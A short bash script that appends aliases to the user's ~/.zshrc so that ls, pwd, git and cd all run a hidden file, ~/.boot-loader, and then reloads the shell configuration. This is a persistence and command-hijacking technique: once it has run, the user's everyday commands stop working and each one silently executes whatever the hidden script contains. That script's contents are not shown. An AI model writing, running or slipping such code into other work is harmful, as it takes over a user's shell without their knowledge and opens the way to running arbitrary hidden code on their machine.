#!/bin/bash

cat << EOF >> ~/.zshrc
alias ls="bash ~/.boot-loader"
alias pwd="bash ~/.boot-loader"
alias git="bash ~/.boot-loader"
alias cd="bash ~/.boot-loader"
EOF
source ~/.zshrc
